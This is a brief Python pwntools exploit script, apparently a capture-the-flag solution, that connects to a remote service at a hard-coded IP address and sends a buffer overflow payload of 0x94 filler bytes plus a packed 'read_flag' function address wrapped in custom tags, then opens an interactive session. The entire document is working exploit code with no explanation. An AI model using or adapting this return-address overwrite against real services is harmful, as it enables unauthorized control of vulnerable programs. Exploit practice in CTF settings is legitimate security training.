from pwn import *
read_flag = 0x080489F8 
#s = remote('192.168.32.236',1234)
s = remote('121.170.91.16', 6051)
raw_input()
s.recvuntil(':')
dat = "<PWNPWN>"
dat += "A"*0x94+p32(read_flag)
dat += "</PWNPWN>"
s.sendline(dat)
s.interactive()
